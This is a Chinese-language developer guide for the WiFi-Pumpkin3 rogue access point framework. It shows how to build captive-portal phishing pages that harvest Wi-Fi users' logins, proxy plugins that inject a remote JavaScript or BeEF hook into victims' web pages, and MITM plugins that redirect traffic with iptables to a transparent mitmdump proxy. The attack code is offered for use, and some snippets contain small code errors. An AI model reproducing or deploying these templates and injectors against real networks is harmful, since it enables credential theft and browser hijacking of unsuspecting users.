# 开发

## captiveflask

为captiveflask插件开发额外的captive portal\(强制门户认证\)

### **extra-captiveflask 库**

`WP3`有`extra-captiveflask`模板供社区所用，你可以共享你所有自定义的captiveflask模板。这非常酷，因为所有的用户可用下载并使用你的自定义模板。查看以下文档：

 [template extra-captiveflask](https://github.com/mh4x0f/extra-captiveflask)

### 概述

captiveflask插件允许攻击者建立一个与web服务器和iptables流量捕获规则结合使用的无线接入点。当用户免费连接的那些无密码网络通常被定向到一个登陆页面，在那里需要密码才能浏览web

### 什么是无线网络钓鱼？

无线网络钓鱼是指攻击者来欺骗无线网络用户获取他们的敏感信息所使用各种技术。正如我们前面所提到的，相关的无线网络通常是开放的，对网络资源的访问时通过一个称为强制认证门户的web应用程序来实现的。强制认证门户是通过web浏览器访问的网页，在新用户被授予对wifi网络更广泛的网络资源访问权限之前，将会显示此页面。此页面通常用于显示登陆或登录（mrzhang76:这是不同的）页面，该页面可能需要身份验证、付款、接受最终用户许可协议或可接受的使用策略或主机和用户都同意遵守的其他有效凭证。

### 创建强制认证门户模板

对于感兴趣的人，我们将在这里简要的介绍创建网络钓鱼门户的过程，创建一个`wp3`的简单强制认证门户模板的配置文件示例。首先，你需要创建一个存储库fork并且添加插件模板。

#### 用于创建简单模板的示例配置文件

```text
# file => ExamplePlugin.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class ExamplePlugin(CaptiveTemplatePlugin):
    meta = {
        'Name'      : 'ExamplePlugin',
        'Version'   : '1.0',
        'Description' : 'Example is a simple portal default page',
        'Author'    : ' the Author',
        'TemplatePath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin',
        'StaticPath' : C.TEMPLATES_FLASK + 'templates/ExamplePlugin/static',
        'Preview' : 'plugins/captivePortal/templates/ExamplePlugin/preview.png'
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = Flase 
```

#### 文件结构

```text
ExamplePlugin/
├── preview.png
├── static
│   ├── css
│   │   ├── bootstrap.min.css
│   │   ├── main.css
│   │   ├── styles.css
│   │   └── util.css
│   └── js
│       ├── bootstrap.min.js
│       ├── jquery-1.11.1.min.js
│       └── main.js
└── templates
    ├── login.html
    └── login_successful.html

4 directories, 9 files
```

#### 编辑html文件

设置你用于钓鱼的自定义登陆认证页面

**login.html**

```text
<!DOCTYPE html>
<html >
<head>
<title>Authentification</title>
<link rel="stylesheet" type="text/css" href="">
<link rel="stylesheet" type="text/css" href="">
</head>
<body >
  <div >
    <!-- Page content -->
    <form method="POST" >
      Login:<br>
      <input type="text" name="login">
      <br>
      Password:<br>
      <input type="text" name="password">
      <br><br>
      <input type="submit" value="Sig up">
    </form>
  </div>
</body>
</html>
```

设置你用于钓鱼的自定义登陆成功页面

 **login\_successful.html**

```text
<!DOCTYPE html>
<html >
<head>
  <title>Authentification</title>
  <link rel="stylesheet" type="text/css" href="">
  <link rel="stylesheet" type="text/css" href="">
  </head>
    <h1>Login successful</h1>
  </body>
</html>
```

现在，你需要将在 `.config/wifipumpkin3/config/app/captive-portal.ini`中包含插件的键值 _`ExamplePlugin=false`_

```text
[plugins]
FlaskDemo=false
Login_v4=false
loginPage=false
DarkLogin=true
 # new key with my new plugin
ExamplePlugin=false 
```

#### 将多语言添加到来宾门户

如果想创建多种语言允许用户选择，在插件的`ExamplePlugin.py`文件中更改`boor var ConfigParser` 为`True`并且覆盖函数 `init_language`

```text
# file => ExamplePlugin.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base


class ExamplePlugin(CaptiveTemplatePlugin):
    meta = {
        'Name'      : 'ExamplePlugin',
        'Version'   : '1.0',
        'Description' : 'Example is a simple portal default page',
        'Author'    : 'The Author',
        'TemplatePath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin',
        'StaticPath' : C.TEMPLATES_FLASK +'templates/ExamplePlugin/static',
        'Preview' : 'plugins/captivePortal/templates/ExamplePlugin/preview.png'
    }

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.dict_domain = {}
        self.ConfigParser = True

    def init_language(self, lang):
        if (lang):
          if (lang.lower() != 'default'):
              self.TemplatePath = C.TEMPLATES_FLASK +'templates/ExamplePlugin/language/{}'.format(lang)
              return
          for key,value in self.meta.items():
              self.__dict__[key] = value
```

文件结构

```text
ExamplePlugin/
├── language
│   ├── En
│   │   └── templates
│   │       ├── login.html
│   │       └── login_successful.html
│   └── ptBr
│       └── templates
│           ├── login.html
│           └── login_successful.html
├── preview.png
├── static
│   ├── css
│   │   ├── bootstrap.min.css
│   │   ├── main.css
│   │   ├── styles.css
│   │   └── util.css
│   └── js
│       ├── bootstrap.min.js
│       ├── jquery-1.11.1.min.js
│       └── main.js
└── templates
    ├── login.html
    └── login_successful.html

9 directories, 13 files
```

现在你需要在 **`captive-portal.ini`**文件中添加键值

```text
[plugins]
FlaskDemo=false
Login_v4=false
loginPage=false
DarkLogin=true
ExamplePlugin=false

# new section
[set_ExamplePlugin]  
# default language
Default=true
# english language
En=false
 #huer huer br
PtBr=false
```

**Include File .py**

在配置完`ExamplePlugin.py`文件后，如截图所示，你需要将`captivePortal`目录从`wifipumpkin3`根目录移动到 `/wifipumpkin3/plugins/captivePortal`

![](../.gitbook/assets/image%20%282%29.png)

在将`ExamplePlugin.py`文件移动到`captivePortal`目录中后，你需要重新安装这一工具，且需在安装时使用的python版本上重新安装

```text
# for python3.7
$ sudo python3.7 setup.py install
# for python3.8
$ sudo python3.8 setup.py install
```

如果你在kali linux上运行此工具并按照之前的指南进行安装，只需：

```text
python3 setup.py install
```

#### 引入模板

现在，只要简单的将 `ExamplePlugin`目录复制到  `.config/wifipumpkin3/config/templates/`，插件将被列出并正常捕捉凭证。

#### 享受吧

现在，你可用去选择保留你的自定义版本或将它共享给所有`wp3`用户。

have fun! Hack the Planet

## **pumpkinproxy**

### **概述**

首先，进行插件模板的引入

```text
from wifipumpkin3.plugins.extension.base import BasePumpkin
```

最基础的插件示例：

```text
from wifipumpkin3.plugins.extension.base import BasePumpkin


class Example(PluginTemplate):
    meta = {
        "_name": "example plugin ",
        "_version": "1.0",
        "_description": "example plugin structure",
        "_author": "by example",
    }

    # get name of plugin static
    @staticmethod
    def getName():
        return Example.meta["_name"]

    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = False # no requeire args

    def handleHeader(self, request, key, value):
        pass

    def handleResponse(self, request, data):
        return data
```

### 修改数据包

使用简单的函数对每个请求添加头部

```text
   def handleResponse(self, request, data):
      data = str(html + "<h1> injected code html </h1>")
      # request.uri url of website 
      print("[{}] [Request]: {} | injected ".format(self._name, request.uri))
      return data
```

示例如何从请求包中移除包头并设置无缓存参数

```text
def handleHeader(self, request, key, value):
        if key.decode().lower() == "cache-control":
            value = "no-cache".encode()

        if key.decode().lower() == "if-none-match":
            value = "".encode()
        if key.decode().lower() == "etag":
            value = "".encode()
```

示例如何实时重写数据包

```text
from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup

class js_inject(BasePumpkin):
    meta = {
        "_name": "js_inject",
        "_version": "1.1",
        "_description": "url injection insert and use our own JavaScript code in a page.",
        "_author": "by Maintainer",
    }

    @staticmethod
    def getName():
        return js_inject.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.url = self._config.get("set_js_inject", "url")

    def handleResponse(self, request, data):

        html = BeautifulSoup(data, "html.parser")
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url = "{}".format(request.uri)
            metatag = html.new_tag("script")
            metatag.attrs["src"] = self.url
            metatag.attrs["type"] = "text/javascript"
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name, url))
        return data
```

### 日志

所有的日志将保存在你的插件中（`pumpkin-prxoy.log`）

### 如何添加参数

现在，如果你想在`proxy.ini`中添加参数并显示在`Pumpkin-Proxy->Settings`中。你需要在“`core/config/app/proxy.ini`”文件中添加键值\(exampleplugin and set\_exampleplugin\)

* exampleplugin 键值是用于更改启用或禁用插件的复选框选项
* set\_exampleplugin 键值用于在设置中搜索所有参数

![](../.gitbook/assets/image%20%283%29.png)

### 带有参数的`wp3`示例

```text
from wifipumpkin3.plugins.extension.base import BasePumpkin
from os import path
from bs4 import BeautifulSoup


class beef(BasePumpkin):
    meta = {
        "_name": "beef",
        "_version": "1.1",
        "_description": "url injection insert and use our own JavaScript code in a page.",
        "_author": "by Maintainer",
    }

    @staticmethod
    def getName():
        return beef.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.urlhook = self.config.get("set_beef", "hook")

    def handleResponse(self, request, data):

        html = BeautifulSoup(data, "html.parser")
        """
        # To Allow CORS
        if "Content-Security-Policy" in flow.response.headers:
            del flow.response.headers["Content-Security-Policy"]
        """
        if html.body:
            url = "{}".format(request.uri)
            metatag = html.new_tag("script")
            metatag.attrs["src"] = self.urlhook
            metatag.attrs["type"] = "text/javascript"
            html.body.append(metatag)
            data = str(html)
            print("[{} js script Injected in [ {} ]".format(self._name, url))
        return data

```

你可以轻松的使用在目录“`plugins/extension/`”中创建python文件实现一个模块，将数据注入到的页面中。使用`make setup`命令，插件将在下一次启动框架时一起启动

## 开发中间人攻击插件

好的，这里将讲解一下更加困难的东西。中间人攻击插件被设计为与接入点（AP）并行运行，更具体的说，它是一个嗅探器用于监视接口就像：`tcpdump -i eth0`这意味着，任何执行这种操作的工具都可以被创建为插件并提交给开发人员用于分析。

我们将开发一个并行运行`tcpdump`的插件作为示例，首先我们需要理解每种结构的工作方式，感谢`Wahyudin Aziz @yudevan`

* 所有插件必须继承`MitmMode`类
* 需要以某种方法调用`MitmMode`类的 `__init__` 方法，以定义该类的基本函数
* 所有插件必须位于`core/servers/mitm`文件夹中
* 应用将在扫描上面提到的目录时自动的加载插件，即使它没有被链接到`config.ini`文件，它们也将被应用列出
* 默认情况下，`MitmMode`类定义的一些方法在启动AP时拥有启动规则，并且这些方法都可以被父类覆盖

```text
   def Start(self):
        self.Initialize()
        self.boot()
```

现在我们知道了如何初始化`MitmMode`类的方法，让我们基于以上的信息搭建一个简单的插件

```text
from wifipumpkin3.core.servers.mitm.mitmmode import MitmMode
from wifipumpkin3.core.common.threads import ProcessThread
import wifipumpkin3.core.utility.constants as C
```

在这个叫做`Tcpdump`的插件中，我们需要在后台去运行tcpdump工具的进程。wp3框架中包含一个名叫`ProcessThread`的类用于在后台运行进程并将命令输出重定向到`_ProcessOutput`对象

```text
class Tcpdump(MitmMode):
    Name = "Tcpdump"
    ID = "tcpdump"
    Author = "PumpkinDev"
    Description = "Tcpdump is a tool used to monitor packets trafficked on a computer network."
    LogFile = C.LOG_TCPDUMP
    ConfigMitmPath = None
    _cmd_array = []
    ModSettings = True
    ModType = "server"
    config = None

    def __init__(self, parent, FSettingsUI=None, main_method=None, **kwargs):
        super(Tcpdump, self).__init__(parent)
        self.setID(self.ID)
        self.setModType(self.ModType)

    @property
    def CMD_ARRAY(self):
        """ list of paraments the tool """
        iface = self.conf.get("accesspoint", "interface")
        self._cmd_array = ["-i", iface]
        return self._cmd_array

    def boot(self):
        if self.CMD_ARRAY:
            self.reactor = ProcessThread({"tcpdump": self.CMD_ARRAY})
            self.reactor._ProcssOutput.connect(self.LogOutput)
            self.reactor.setObjectName(self.ID)
```

`Tcpdump`类有一些重要的属性，例如：Name, ID, ModType 和 LogFile，它们对于插件的正常工作是必须的。

### 启动方法

`self.reactor`是仅在启动时被定义的重要属性，有了它我们可以在简化我们后台中的全部流程，你只需要在启动方法中定义它并确保运转良好。记住，当使用`stop`命令禁用AP时，`self.reactor.stop()`将被调用用于终止后台进程

### Tcpdump LogFile

`LogFile`属性负责告知插件将以执行命令的输出保存位置。你需要在`core / utility / constants.py`文件中添加`.log`文件的名称

```text
LOG_TCPDUMP = user_config_dir + "/.config/wifipumpkin3/logs/ap/tcpdump.log"
```

### 额外的属性或方法

Name ,ID和ModType属性是必须的，它们被定义为：

* Name - 插件名称
* ID - 插件ID \(小写\)
* ModType - 服务类型

如果你使用外部工具运行`self.LogOutput`方法，你不需要重写这一方法，因为日志通常已经被工具输出。但是如果你想要重写它，并没有特殊的要求，只需在最后使用`self.logger.info(data)`将数据保存到`LOG_TCPDUMP`文件中

## 开发代理

要开发一个代理你需要做的比开发插件更多，因为它和插件不一样，代理有它自己的规则并实际上运行在客户端与服务器端的通信之中，这种代理被叫做透明代理。有时你的插件并不是作为代理开发的（它运行在通信过程中），但是，如果它在某些时候执行了iptables规则，自然而然的我们就称其为一个代理，因为它进行了流量的处理。

现在我们来看看代理是如何让工作的，理解一下它的独特之处

* 所有代理必须继承`ProxyMode`类
* 需要以某种方法调用`ProxyMode`类的 `__init__` 方法，以定义该类的基本函数
* 所有代理必须位于`core/servers/proxy`文件夹中
* 应用将在扫描上面提到的目录时自动的加载代理，即使它没有被链接到`config.ini`文件，它们也将被应用列出
* 默认情况下，`ProxyMode`类定义的一些方法在启动AP时拥有启动规则，并且这些方法都可以被父类覆盖

```text
    def Start(self):
        self.Active.Initialize()
        self.Active.Serve()
        self.Active.boot()
```

现在，我们知道如何初始`ProxyMode`类的方法，让我们基于以上的信息搭建一个简单的插件

```text
from wifipumpkin3.core.servers.proxy.proxymode import ProxyMode
import wifipumpkin3.core.utility.constants as C
from wifipumpkin3.core.common.threads import ProcessThread
```

在这个名为Mitmdump的插件中，我们将要在后台运行  [mitmdump](https://mitmproxy.org/) 工具的进程。wp3框架中包含一个名叫`ProcessThread`的类用于在后台运行进程并将命令输出重定向到`_ProcessOutput`对象

```text
class Mitmdump(ProxyMode):
    Name = "Mitmdump"
    Author = "Pumpkin-Dev"
    ID = "mitmdump"
    Description = "Transparent proxies with mitmproxy"
    Hidden = False
    LogFile = C.LOG_MITMDUMP
    CONFIGINI_PATH = C.CONFIG_PP_INI
    _cmd_array = []
    RunningPort = 8080
    ModType = "proxy"
    TypePlugin = 1

    def __init__(self, parent=None, **kwargs):
        super(Mitmdump, self).__init__(parent)
        self.setID(self.ID)
        self.parent = parent
        self.setTypePlugin(self.TypePlugin)

    def Initialize(self):
        self.add_default_rules(
            "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {}".format(
                self.getRunningPort()
            )
        )
        self.runDefaultRules()

    @property
    def CMD_ARRAY(self):
        self._cmd_array = ["-p", self.getRunningPort(), 
        '--ssl-insecure', '--set' ,'upstream_cert=false','-k']
        return self._cmd_array

    def boot(self):
        self.reactor = ProcessThread({"mitmdump": self.CMD_ARRAY})
        self.reactor._ProcssOutput.connect(self.LogOutput)
        self.reactor.setObjectName(self.ID)
```

Mitmdump类有一些重要的属性，例如：Name, ID, ModType 和 LogFile，它们对于插件的正常工作是必须的。其中有个重要的方法：`add_default_rules`，这个方法允许你去添加一个在调用`Initialize`时执行的规则

### 初始化方法

初始化方法将初始化代理的一些预定义配置，举个例子，`runDefaultRules`方法将迭代iptables规则列表

### 启动方法

`self.reactor`是仅在启动时被定义的重要属性，有了它我们可以在简化我们后台中的全部流程，你只需要在启动方法中定义它并确保运转良好。记住，当使用`stop`命令禁用AP时，`self.reactor.stop()`将被调用用于终止后台进程

### **Mitmdump LogFile**

`LogFile`属性负责告知插件将以执行命令的输出保存位置。你需要在`core / utility / constants.py`文件中添加`.log`文件的名称

```text
LOG_MITMDUMP = user_config_dir + "/.config/wifipumpkin3/logs/ap/mitduump.log"
```

### 额外的属性或方法

Name ,ID和ModType属性是必须的，它们被定义为：

* Name - 插件名称
* ID - 插件ID \(小写\)
* ModType - 服务类型

如果你使用外部工具运行`self.LogOutput`方法，你不需要重写这一方法，因为日志通常已经被工具输出。但是如果你想要重写它，并没有特殊的要求，只需在最后使用`self.logger.info(data)`将数据保存到`LOG_TCPDUMP`文件中

